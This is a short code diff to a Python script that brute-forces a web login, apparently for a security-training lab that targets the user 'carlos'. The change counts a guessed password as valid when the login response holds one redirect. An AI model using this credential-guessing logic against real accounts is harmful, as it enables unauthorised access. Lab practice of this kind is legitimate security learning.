@@ -22,8 +22,10 @@ def guess_password(username):
             intended_response = requests.post(url, cookies=cookies, data=data)
             print(data)
             print(intended_response.history)   
-                        
-            if (username == "carlos") and ( str(response.history) == str(intended_response.history)):
+            
+            '''The password will be valid if the username is "carlos" and the direction happened at least one time in the "history" list of the response during logging in so it will be succeeded.'''
+            
+            if (username == "carlos") and (len(intended_response.history) == 1):
                 print(colored(f"[+] Valid password is found... ","green"))
                 return password  
             else:
